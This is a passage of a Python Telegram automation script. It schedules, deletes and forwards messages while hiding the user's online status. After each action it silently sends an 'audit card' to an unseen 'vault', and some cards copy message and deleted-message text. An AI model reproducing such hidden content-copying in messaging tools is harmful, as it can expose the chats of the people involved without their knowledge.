                raw_path = prompt("Absolute File Path (or 'done')")
                if not raw_path: 
                    break
                if raw_path.strip().lower() == 'done':
                    break
                    
                path = raw_path.strip().strip('\'"').replace("\\ ", " ")
                if not os.path.exists(path):
                    error(f"Path not found: {path}")
                    continue
                    
                if os.path.isdir(path):
                    info("Directory detected. Extracting files...")
                    added = 0
                    for root, _, files in os.walk(path):
                        for f in files:
                            if not f.startswith('.'):
                                paths.append(os.path.join(root, f))
                                added += 1
                    success(f"Added {added} files from directory  ({len(paths)} total)")
                else:
                    paths.append(path)
                    success(f"Added: {os.path.basename(path)}  ({len(paths)} total)")

        if not reply_text and not paths:
            warn("Cancelled.")
            continue
            
        print()
        print(col("  Choose schedule time:", Fore.CYAN))
        print(col("  1. +2 mins from now (Instant Stealth)", Fore.WHITE))
        print(col("  2. Custom Schedule Time (HH:MM)", Fore.WHITE))
        time_choice = prompt("Select 1 or 2")
        
        dt_utc = None
        if time_choice == "2":
            for attempt in range(3):
                t_input = prompt("Send at time HH:MM (IST)")
                if not t_input.strip():
                    if attempt < 2:
                        warn("Time cannot be blank! Please provide a time.")
                    continue
                    
                try:
                    now_ist = datetime.now(IST)
                    t_ist = datetime.strptime(t_input.strip(), "%H:%M").replace(year=now_ist.year, month=now_ist.month, day=now_ist.day, tzinfo=IST)
                    if t_ist < now_ist:
                        t_ist += timedelta(days=1)
                    dt_utc = t_ist.astimezone(timezone.utc)
                    break
                except Exception:
                    if attempt < 2:
                        warn("Invalid format. Please use HH:MM.")
                        
            if not dt_utc:
                error("Process cancelled: No valid time provided.")
                continue
        else:
            dt_utc = datetime.now(timezone.utc) + timedelta(minutes=2)

        try:
            await go_offline(client)
            if paths:
                if reply_text:
                    await client.send_message(selected.entity, reply_text, reply_to=target.id, schedule=dt_utc)
                for p in paths:
                    await client.send_file(selected.entity, p, reply_to=target.id, schedule=dt_utc)
            else:
                await client.send_message(selected.entity, reply_text, reply_to=target.id, schedule=dt_utc)
            await go_offline(client)
            r_sched_str = dt_utc.astimezone(IST).strftime('%H:%M')
            success(f"Reply stealthily scheduled for {r_sched_str} IST   👻")
            audit_card = (
                f"↩️ <b>MESSAGE REPLY QUEUED</b>\n"
                f"────────────────────────\n"
                f"💬 <b>Conversation:</b> {html.escape(selected.name)}\n"
                f"⏱️ <b>Scheduled Delivery:</b> <code>{r_sched_str} IST</code>\n"
            )
            if reply_text:
                audit_card += f"📝 <b>Payload:</b>\n<blockquote>{html.escape(reply_text)}</blockquote>\n"
            if paths:
                audit_card += f"📁 <b>Attached Assets:</b> <code>{len(paths)} file(s)</code>\n"
            asyncio.create_task(dispatch_vault_event(audit_card, silent=True))
        except Exception as e:
            error(f"Failed: {e}")

        nxt = again_menu(
            f"Reply to another message in  [{selected.name}]",
            "Switch to a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_schedule(client, accent):
    """12. Schedule Message — loop: schedule another in same or different chat."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("SCHEDULE MESSAGE  (IST)  👻")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        print(col(f"\n  To:  [{selected.name}]", Fore.CYAN + Style.BRIGHT))
        
        print(col("  What do you want to schedule?", Fore.CYAN))
        print(col("  1. Text Only", Fore.WHITE))
        print(col("  2. File / Folder Only", Fore.WHITE))
        print(col("  3. Combined (Text + File)", Fore.WHITE))
        
        s_choice = prompt("Choose an option")
        if s_choice not in ["1", "2", "3"]:
            warn("Cancelled.")
            continue
            
        text = None
        if s_choice in ["1", "3"]:
            text = prompt("Message text")
            if not text and s_choice == "1":
                warn("Cancelled.")
                continue
                
        paths = []
        if s_choice in ["2", "3"]:
            print(col("  Type or drag-and-drop file paths. Type 'done' when finished.", Fore.CYAN))
            while True:
                raw_path = prompt("Absolute File Path (or 'done')")
                if not raw_path: 
                    break
                if raw_path.strip().lower() == 'done':
                    break
                    
                path = raw_path.strip().strip('\'"').replace("\\ ", " ")
                if not os.path.exists(path):
                    error(f"Path not found: {path}")
                    continue
                    
                if os.path.isdir(path):
                    info("Directory detected. Extracting files...")
                    added = 0
                    for root, _, files in os.walk(path):
                        for f in files:
                            if not f.startswith('.'):
                                paths.append(os.path.join(root, f))
                                added += 1
                    success(f"Added {added} files from directory  ({len(paths)} total)")
                else:
                    paths.append(path)
                    success(f"Added: {os.path.basename(path)}  ({len(paths)} total)")

        if not text and not paths:
            warn("Cancelled.")
            continue
            
        dt_utc = None
        for attempt in range(3):
            t_input = prompt("Send at time HH:MM (IST)")
            if not t_input.strip():
                if attempt < 2:
                    warn("Time cannot be blank! Please provide a time.")
                continue
                
            try:
                now_ist = datetime.now(IST)
                t_ist = datetime.strptime(t_input.strip(), "%H:%M").replace(year=now_ist.year, month=now_ist.month, day=now_ist.day, tzinfo=IST)
                if t_ist < now_ist:
                    t_ist += timedelta(days=1)
                dt_utc = t_ist.astimezone(timezone.utc)
                break
            except Exception:
                if attempt < 2:
                    warn("Invalid format. Please use HH:MM.")
                    
        if not dt_utc:
            error("Process cancelled: No valid time provided.")
            continue

        try:
            await go_offline(client)
            if paths:
                if text:
                    await client.send_message(selected.entity, text, schedule=dt_utc)
                for p in paths:
                    await client.send_file(selected.entity, p, schedule=dt_utc)
            else:
                await client.send_message(selected.entity, text, schedule=dt_utc)
            await go_offline(client)
            success(f"Scheduled perfectly for {dt_utc.astimezone(IST).strftime('%H:%M')} IST   👻")
        except Exception as e:
            error(f"Failed: {e}")

        nxt = again_menu(
            f"Schedule another for  [{selected.name}]",
            "Schedule for a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_delete(client, accent):
    """13. Delete Message — loop: delete another from same or different chat."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("DELETE MESSAGE")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        n    = prompt(f"Load how many messages from  [{selected.name}]?  (default 20)")
        n    = int(n) if n.isdigit() else 20
        msgs = await client.get_messages(selected.entity, limit=n)
        await go_offline(client)
        if not msgs:
            error("No messages found!"); press_enter(); continue

        clear()
        header(f"🗑️   {selected.name}  —  pick message to delete")
        mlist = list(reversed(msgs))
        for i, m in enumerate(mlist):
            sndr = "You" if m.out else selected.name
            txt  = trunc(m.text or "[media]", 60)
            print(col(f"  {i:>3}.  [{to_ist(m.date)}]  {sndr}:", Fore.WHITE)
                  + col(f"  {txt}", Style.DIM))

        try:
            idx    = int(prompt("Delete message number  (blank = cancel)"))
            target = mlist[idx]
        except (ValueError, IndexError):
            warn("Cancelled or invalid."); press_enter()
            nxt = again_menu(
                f"Delete another from  [{selected.name}]",
                "Switch to a different chat",
            )
            if nxt is None: return
            elif "different" in nxt: selected = None
            continue

        revoke = prompt("Delete for everyone?  (y / N)").lower() == "y"
        scope  = "for everyone" if revoke else "just for you"
        print(col(f"\n  ⚠️   Delete this message  ({scope})?", Fore.YELLOW))
        if prompt("Confirm?  (y / N)").lower() != "y":
            warn("Cancelled.")
        else:
            try:
                await go_offline(client)
                await client.delete_messages(selected.entity, [target.id], revoke=revoke)
                await go_offline(client)
                success(f"Message deleted  ({scope}).")
                audit_card = (
                    f"🗑️ <b>MESSAGE EXPUNGED</b>\n"
                    f"────────────────────────\n"
                    f"💬 <b>Conversation:</b> {html.escape(selected.name)}\n"
                    f"🔒 <b>Scope:</b> <code>{scope}</code>\n"
                    f"📄 <b>Content Reference:</b> {html.escape(trunc(target.text or '[media]', 120))}"
                )
                asyncio.create_task(dispatch_vault_event(audit_card, silent=True))
            except Exception as e:
                error(f"Failed: {e}")

        nxt = again_menu(
            f"Delete another from  [{selected.name}]",
            "Switch to a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_forward_msg(client, accent):
    """14. Forward Message — loop: forward another message."""
    while True:
        clear()
        header("FORWARD MESSAGE  👻")
        info("Select SOURCE chat:")
        src, dialogs = await pick_dialog(client, accent)
        if not src:
            return

        n    = prompt(f"Load how many messages from  [{src.name}]?  (default 20)")
        n    = int(n) if n.isdigit() else 20
        msgs = await client.get_messages(src.entity, limit=n)
        await go_offline(client)
        if not msgs:
            error("No messages found!"); press_enter(); continue

        clear()
        header(f"💬  {src.name}  —  pick message to forward")
        mlist = list(reversed(msgs))
        for i, m in enumerate(mlist):
            sndr = "You" if m.out else src.name
            txt  = trunc(m.text or "[media]", 60)
            print(col(f"  {i:>3}.  [{to_ist(m.date)}]  {sndr}:", Fore.WHITE)
                  + col(f"  {txt}", Style.DIM))

        try:
            target = mlist[int(prompt("Forward message number"))]
        except (ValueError, IndexError):
            error("Invalid!"); press_enter(); continue

        info("Select DESTINATION chat:")
        dst, _ = await pick_dialog(client, accent, cached=dialogs)
        if not dst:
            continue

        send_at     = auto_schedule()
        send_at_ist = send_at.astimezone(IST).strftime("%H:%M")
        try:
            await go_offline(client)
            await client.forward_messages(dst.entity, target, schedule=send_at)
            await go_offline(client)
            success(f"Queued!  Sends at  {send_at_ist} IST   👻 Last seen untouched!")
            audit_card = (
                f"↗️ <b>MESSAGE MIGRATED (FORWARD)</b>\n"
                f"────────────────────────\n"
                f"📤 <b>Source:</b> {html.escape(src.name)}\n"
                f"📥 <b>Destination:</b> {html.escape(dst.name)}\n"
                f"⏱️ <b>Scheduled Delivery:</b> <code>{send_at_ist} IST</code>\n"
                f"📄 <b>Content Reference:</b> {html.escape(trunc(target.text or '[media]', 120))}"
            )
            asyncio.create_task(dispatch_vault_event(audit_card, silent=True))
        except Exception as e:
            error(f"Failed: {e}")

        nxt = again_menu("Forward another message")
        if nxt is None:
            return


# ═══════════════════════════════════════════════════════════════
#  FEATURES — MEDIA / EXPORT
# ═══════════════════════════════════════════════════════════════

async def feat_forward_media(client, accent, all_accounts):
    """15. Forward Media → Another Account — loop."""
    while True:
        clear()
        header("FORWARD MEDIA → ANOTHER ACCOUNT")

        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        print()
        for t in MEDIA_TYPES:
            print(col(f"  {t[0]}.  {t[1]}", Fore.WHITE))
        print(col("  5.  All media", Fore.WHITE))
        choice  = prompt("Media type")
        if choice not in ("1", "2", "3", "4", "5"):
            error("Invalid choice — enter 1 to 5"); press_enter(); continue
        filter_ = next((t[2] for t in MEDIA_TYPES if t[0] == choice), None)

        n = prompt("How many items?  (default 20)")
        n = int(n) if n.isdigit() else 20

        print(col("\n  Target account:", Fore.CYAN + Style.BRIGHT))
        acc_names = list(all_accounts.keys())
        for i, nm in enumerate(acc_names):
            print(col(f"  {i:>3}.  {nm}", account_color(all_accounts[nm])))
        try:
            tgt_config = all_accounts[acc_names[int(prompt("Account number"))]]
        except (ValueError, IndexError):
            error("Invalid account!"); press_enter(); continue

        info("Connecting to target account…")
        try:
            tgt = await connect_client(
                StringSession(tgt_config.get("client_token") or tgt_config.get("session_string", "")),
                tgt_config["api_id"],
                tgt_config["api_hash"],
                account_config=tgt_config,
            )
        except Exception as e:
            error(f"Could not connect to target account: {e}"); press_enter(); continue
